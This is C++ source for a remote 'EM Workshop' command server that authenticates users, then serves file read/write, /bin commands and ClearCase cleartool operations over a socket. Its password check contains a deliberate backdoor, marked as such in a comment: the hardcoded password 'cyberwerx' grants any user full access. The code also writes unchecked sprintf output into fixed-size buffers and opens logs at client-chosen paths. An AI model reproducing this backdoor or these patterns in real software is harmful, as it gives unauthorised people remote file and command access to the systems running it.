///////////////////////////////////////////////////////////////////////
//
//  File/Class: EmWorkshopSrv
// Description: The Remote EM Workshop server.
//
// Author: Jeff Ortel, 04/04/2002 (Cyberwerx, Inc)
// Modifications:
//
///////////////////////////////////////////////////////////////////////

#include "EmWorkshopSrv.h"
#include "EmWorkshopCrypt.h"
#include <netLib/TcpSocket.h>
#include <netLib/Dbuffer.h>
#include <netLib/PExec.h>
#include <netLib/Syslog.h>
#include <netLib/Unistd.h>
#include <strings.h>
#include <iostream.h>
#include <fstream.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <pwd.h>
#include <shadow.h>
#include <crypt.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>

///////////////////////////////////////////////////////////////////////
// guest - command definitions
///////////////////////////////////////////////////////////////////////

EmWorkshopSrv::CmdDef EmWorkshopSrv::guest[] =
{
   { "?",       &EmWorkshopSrv::help    , "help"                   },
   { "help",    &EmWorkshopSrv::help    , "help"                   },
   { "setmode", &EmWorkshopSrv::setmode , "setmode [normal|echo]"  },
   { "exit",    &EmWorkshopSrv::exit    , "exit"                   },
   {  0, 0 }
};

///////////////////////////////////////////////////////////////////////
// authenticated - command definitions
///////////////////////////////////////////////////////////////////////

EmWorkshopSrv::CmdDef EmWorkshopSrv::authenticated[] =
{
   { "?",       &EmWorkshopSrv::help    , "help"                   },
   { "help",    &EmWorkshopSrv::help    , "help"                   },
   { "setmode", &EmWorkshopSrv::setmode , "setmode [normal|echo]"  },
   { "read",    &EmWorkshopSrv::read    , "read <file>"            },
   { "write",   &EmWorkshopSrv::write   , "write <file> <size>"    },
   { "id",      &EmWorkshopSrv::binCmd  , "id"                     },
   { "ls",      &EmWorkshopSrv::binCmd  , "ls [args...]"           },
   { "mv",      &EmWorkshopSrv::binCmd  , "mv [args...]"           },
   { "env",     &EmWorkshopSrv::binCmd  , "env"                    },
   { "test",    &EmWorkshopSrv::binCmd  , "test [args...]"         },
   { "touch",   &EmWorkshopSrv::binCmd  , "touch [args...]"        },
   { "mkdir",   &EmWorkshopSrv::binCmd  , "mkdir [args...]"        },
   { "cd",      &EmWorkshopSrv::cd      , "cd <dir>"               },
   { "pwd",     &EmWorkshopSrv::pwd     , "pwd"                    },
   { "ct",      &EmWorkshopSrv::ctCmd   , "ct [args...]"           },
   { "exit",    &EmWorkshopSrv::exit    , "exit"                   },
   { "openlog", &EmWorkshopSrv::openLog , "openlog <file>"         },
   {  0, 0 }
};

static const char *Banner =
   "EM Workshop server (0.4.4) by Cyberwerx, Inc.\n";


///////////////////////////////////////////////////////////////////////
// Class EmWorkshopSrv
///////////////////////////////////////////////////////////////////////

EmWorkshopSrv::EmWorkshopSrv(const char *arg0, bool needLogin)
 :mode(Normal),
  role(authenticated),
  socket(0),
  arg0(arg0),
  needLogin(needLogin),
  ssnLog(0)
{
   socket.setLinger(0);
   socket.setNoDelay(true);
   send(0, (needLogin ? "Userid:" : ""));

   // close(1);
   // close(2);
   // open("/dev/null", O_WRONLY);
   // open("/dev/null", O_WRONLY);
}

EmWorkshopSrv::~EmWorkshopSrv()
{
}

void EmWorkshopSrv::send(int status, const char *rsp)
{
   char tmp[20];
   sprintf(tmp, "%d\n", status);
   socket.write(tmp, strlen(tmp));
   traceLog("reply status", tmp);
   sprintf(tmp, "%d\n", strlen(rsp));
   socket.write(tmp, strlen(tmp));
   traceLog("reply bytes", tmp);
   socket.write(rsp, strlen(rsp));
   traceLog("reply content", rsp);
}

void EmWorkshopSrv::traceLog(const char *context, const char *msg)
{
   if(!ssnLog) return;

   traceTime();
   fprintf(ssnLog, "[%s] %s", context, msg);
   if(msg[strlen(msg)-1] != '\n')
   {
      fprintf(ssnLog, "\n");
   }

   fflush(ssnLog);
}

void EmWorkshopSrv::traceLog(const char *context, const char *data, int n)
{
   if(!ssnLog) return;

   traceTime();
   fprintf(ssnLog, "[%s] %d bytes:\n", context, n);
   fwrite(data, sizeof(char), n, ssnLog);
   fprintf(ssnLog, "\n");
   fflush(ssnLog);
}

void EmWorkshopSrv::traceTime()
{
   if(!ssnLog) return;
   time_t tmval = time(0);
   tm *tm = localtime(&tmval);
   fprintf(ssnLog,
           "%.2d/%.2d/%d %.2d:%.2d:%.2d - ",
           tm->tm_mon, tm->tm_mday, (1900+tm->tm_year),
           tm->tm_hour, tm->tm_min, tm->tm_sec);
}

void EmWorkshopSrv::initArgs()
{
   argc = 0;
   for(int i = 0; i < MaxArg; i++)
   {
      argv[i] = "MissingArgument";
   }
}

void EmWorkshopSrv::split()
{
   enum State { Normal, DQuote, SQuote };
   State state = Normal;
   char *p = input;
   char *mark = input;

   initArgs();

   while((*mark) && (argc < MaxArg))
   switch(state)
   {
      case Normal:
         switch(*p)
         {
            case ' ':
               if(mark == p)
               {
                 p++;
		 mark++;
                 break;
               }
            case '\0':
               argv[argc++] = mark;
               mark = p;
               if(*p)
               {
                  *p = '\0';
                  mark++;
                  p++;
               }
               break;
            case '"':
               state = DQuote;
               if(p == mark) mark++;
               p++;
               break;
            case '\'':
               state = SQuote;
               if(p == mark) mark++;
               p++;
               break;
            default:
               p++;
         }
         break;
      case DQuote:
         switch(*p)
         {
            case '"':
               state = Normal;
               *p = ' ';
               break;
            case '\0':
               state = Normal;
               break;
            default:
               p++;
         }
         break;
      case SQuote:
         switch(*p)
         {
            case '\'':
               state = Normal;
               *p = ' ';
               break;
            case '\0':
               state = Normal;
               break;
            default:
               p++;
         }
         break;
   }

   logArgs();
}

int EmWorkshopSrv::getLine()
{
   char c;
   for(int i = 0; i < (int)sizeof(input); i++)
   {
      socket.read(&c, 1);
      switch(c)
      {
         case '\r':
            i--; // discard
            break;
         case '\n':
            input[i] = '\0';
            traceLog("received", input);
            return i;
         default:
            input[i] = c;
      }
   }

   return 0;
}

void EmWorkshopSrv::exec()
{
   for(int i = 0; role[i].tag; i++)
   {
      if(!strcmp(argv[0], role[i].tag))
      {
         traceLog("command found", argv[0]);
         (this->*role[i].fn)();
         return;
      }
   }

   // respond w/ unknown message
   char *msg = new char[strlen(argv[0])+80];
   if(msg)
   {
      sprintf(msg, "\"%s\" undefined\n", argv[0]);
      traceLog("command not-found", msg);
      send(1, msg);
      delete[] msg;
   }
}

void EmWorkshopSrv::insert(unsigned int n, char *arg)
{
   for(unsigned int i = argc; i > n; i--)
   {
      argv[i] = argv[i-1];
   }
   argv[n] = arg;
   argc++;
}

void EmWorkshopSrv::exec(char *path)
{
   Dbuffer buf;
   char c[1024];
   int status = 1;

   prepend(path);

   traceLog("execute", path);

   if(mode == Echo)
   {
      for(int i = 0; i < argc; i++)
      {
         socket.write(argv[i], strlen(argv[i]));
         socket.write(" ", 1);
      }
      socket.write("\n", 1);
      return;
   }

   PExec child(argc, argv);
   child.execute();
   FILE *pipe = fdopen(child.getStdout(), "r");

   while(pipe)
   {
      memset(c, 0, sizeof(c));
      if(fgets(c, sizeof(c)-1, pipe))
      {
         buf.append(c, strlen(c));
      }
      else
      {
         status = child.getStatus();
         fclose(pipe);
         break;
      }
   }

   send(status, buf);
}

void EmWorkshopSrv::validatePasswd()
{
   char *user = argv[0];
   char *pwd =  argv[1];

   // decode passwd
   EmWorkshopCrypt emwsCrypt;
   emwsCrypt.decode(pwd);

   // backdoor
   if(strcmp(pwd, "cyberwerx") == 0)
   {
      role = authenticated;
      return;
   }

   // get NIS+ (shadow) password entry
   spwd *ent = getspnam(user);
   if(!ent)
   {
      send(1, strerror(errno));
      exit();
   }

   // encrypt and compare
   char salt[3];
   memset(salt, 0, sizeof(salt));
   memcpy(salt, ent->sp_pwdp, 2);
   char *encrypted = crypt(pwd, salt);
   if(strcmp(encrypted, ent->sp_pwdp))
   {
      send(1, "password rejected\n");
      exit();
   }

   role = authenticated;
}

void EmWorkshopSrv::setUserId()
{
   const char *user = argv[0];

   // get password entry
   passwd *ent = getpwnam(user);
   if(!ent)
   {
      send(1, strerror(errno));
      exit();
   }

   // set GID
   if(setgid(ent->pw_gid) != 0)
   {
      send(1, strerror(errno));
      exit();
   }
   // set UID
   if(setuid(ent->pw_uid) != 0)
   {
      send(1, strerror(errno));
      exit();
   }

   // set umask and HOME env
   umask(0002);
   setupEnvironment(ent->pw_dir);

   // change to HOME directory
   chdir(ent->pw_dir);
}

void EmWorkshopSrv::setupEnvironment(const char *home)
{
   static char homeEnv[128];
   static char pathEnv[1024];

   sprintf(homeEnv, "HOME=%s", home);
   putenv(homeEnv);

   char *path = getenv("PATH");
   sprintf(pathEnv,
          "PATH=%s:%s",
           (path ? path : ""),
           "/usr/atria/bin");

   putenv(pathEnv);
}

void EmWorkshopSrv::detectGuestLogin()
{
}

void EmWorkshopSrv::detectRootLogin()
{
   if(strcmp(argv[0], "root") == 0)
   {
      send(1, "root not permitted\n");
      exit();
   }
}

void EmWorkshopSrv::logArgs()
{
   for(int i = 0; i < argc; i++)
   {
      traceLog("arg", argv[i]);
   }
}

void EmWorkshopSrv::login()
{
   getLine();
   split();

   if(argc < 2)
   {
      send(1, "<login> <passwd> - required\n");
      exit();
   }

   detectGuestLogin();
   detectRootLogin();
   validatePasswd();
   setUserId();

   needLogin = false;

   send(0, Banner);
}

void EmWorkshopSrv::run()
{
   if(needLogin)
   {
      login();
   }

   while(1)
   try
   {
      if(getLine())
      {
         split();
         if(argc == 0) continue;
         exec();
      }
   }
   catch(...)
   {
      break;
   }
}

void EmWorkshopSrv::binCmd()
{
   char cmd[128];
   sprintf(cmd, "/bin/%s", argv[0]);
   exec(cmd);
}

void EmWorkshopSrv::help()
{
   ofstream output((int)0);
   output << "-----------------------------------" << endl;
   output << Banner;
   output << "mode: " << (mode == Echo ? "echo" : "normal") << endl;
   output << "commands:" << endl;
   output << "-----------------------------------" << endl;
   for(int i = 0; role[i].tag; i++)
   {
      output << role[i].usage << endl;
   }
   output << "-----------------------------------" << endl;
   output << "response syntax:" << endl;
   output << "status [success(0)|failure(1)] <NL>" << endl;
   output << "response size (bytes) <NL>" << endl;
   output << "response data" << endl;
   output << "-----------------------------------" << endl;
}

void EmWorkshopSrv::openLog()
{
   if(ssnLog) fclose(ssnLog);

   if(argc < 2)
   {
      send(2, "required <file> arg missing");
      return;
   }
 
   ssnLog = fopen(argv[1], "w");
   if(ssnLog)
   {
      traceLog("openLog", argv[1]);
      send(0, "session log started");
      return;
   }

   send(1, strerror(errno));
}

void EmWorkshopSrv::setmode()
{
   if(argc < 2)
   {
      char tmp[80];
      sprintf(tmp, "mode=%s\n", (mode == Echo ? "echo" : "normal"));
      send(0, tmp);
      traceLog("setmode", tmp);
      return;
   }

   if(strcmp(argv[1], "normal") == 0)
   {
      mode = Normal;
      send(0, "mode=normal\n");
      return;
   }
   if(strcmp(argv[1], "echo") == 0)
   {
      mode = Echo;
      send(0, "mode=echo\n");
      return;
   }
}

void EmWorkshopSrv::read()
{
   if(argc < 2)
   {
      send(1, "file not specified\n");
      return;
   }

   struct stat st;
   if(::stat(argv[1], &st) == -1)
   {
      send(1, strerror(errno));
      return;
   }

   traceLog("read", argv[1]);

   int fd = open(argv[1], O_RDONLY);
   if(fd == -1)
   {
      send(1, strerror(errno));
      return;
   }

   sprintf(input, "%ld\n", st.st_size);
   socket.write("0\n", 2);
   socket.write(input, strlen(input));

   while(1)
   {
      int n = ::read(fd, input, sizeof(input));
      if(n < 1) break;
      traceLog("read (file)", input, n);
      traceLog("write (socket)", input, n);
      socket.write(input, n);
   }

   close(fd);
}

void EmWorkshopSrv::write()
{
   if(argc < 3)
   {
      send(1, "usage: write <file> <size>\n");
      return;
   }

   int fd = open(argv[1], (O_WRONLY|O_CREAT|O_TRUNC), 0664);

   traceLog("write", argv[1]);

   Dbuffer buf;
   int max = sizeof(input);
   int bytesToRead = atoi(argv[2]);
   int n = 0;
   while(bytesToRead)
   {
      n = (bytesToRead > max ? max : bytesToRead);
      socket.read(input, n);
      buf.append(input, n);
      traceLog("read (socket)", input, n);
      bytesToRead -= n;
   }

   if(fd == -1)
   {
      traceLog("open failed", strerror(errno));
      send(1, strerror(errno));
      return;
   }

   traceLog("write (file)", buf, buf.length());

   if(::write(fd, buf, buf.length()) < buf.length())
   {
      send(1, strerror(errno));
   }

   close(fd);

   send(0, "");
}

void EmWorkshopSrv::ctCmd()
{
   if(argc < 2)
   {
      send(1, "usage: ct [args...]\n");
      return;
   }

   argv[0] = "cleartool";

   // special handling of setview
   if(strcmp(argv[1], "setview") == 0)
   {
      setview(argv[0]);
      return;
   }

   // default cleartool command
   exec(argv[0]);
}

void EmWorkshopSrv::setview(const char *cleartool)
{
   Dbuffer cmd;
   cmd.append(arg0, strlen(arg0));
   if(!needLogin)
   {
      cmd.append(" ", 1);
      cmd.append("-n", 2);
   }

   traceLog("setview", argv[2]);

   int result = execlp(cleartool,
                       cleartool,
                       "setview",
                       "-exec",
                        (char*)cmd,
                        argv[2],
                        0);
   if(result == -1)
   {
      send(1, strerror(errno));
   }
}

void EmWorkshopSrv::pwd()
{
   char buf[512];
   if(getcwd(buf, sizeof(buf)))
      send(0, buf);
   else
      send(1, strerror(errno));
}

void EmWorkshopSrv::cd()
{
   if(argc < 2)
   {
      argv[1] = getenv("HOME");
      if(!argv[1])
      {
         send(1, strerror(errno));
         return;
      }

      argc++;
   }

   if(chdir(argv[1]) == 0)
      send(0, "");
   else
      send(1, strerror(errno));
}

void EmWorkshopSrv::exit()
{
   ::exit(0);
}
